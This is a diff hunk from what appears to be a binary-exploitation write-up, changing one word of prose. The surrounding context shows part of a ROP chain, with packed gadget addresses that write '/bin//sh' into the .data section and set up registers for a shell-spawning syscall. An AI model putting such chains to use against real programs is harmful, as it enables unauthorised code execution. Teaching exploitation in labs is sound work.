@@ -175,7 +175,7 @@ p += '/bin//sh'.encode()
 p += pack('<Q', 0x0000000000481e65) # mov qword ptr [rsi], rax ; ret
 ```
 
-We write a null byte to the address where is located the .data section + 8, then we set the right values for the three registers that will be used for the syscall, now we the RDI argument will point to /bin/sh string located where the .data section start and the RSI and RDX point to the null byte located at the address of .data + 8, so they are zero out.
+We write a null byte to the address where is located the .data section + 8, then we set the right values for the three registers that will be used for the syscall, now we the RDI argument will point to /bin/sh string located where the .data section starts and the RSI and RDX point to the null byte located at the address of .data + 8, so they are zero out.
 
 ```
 p += pack('<Q', 0x000000000040f4be) # pop rsi ; ret
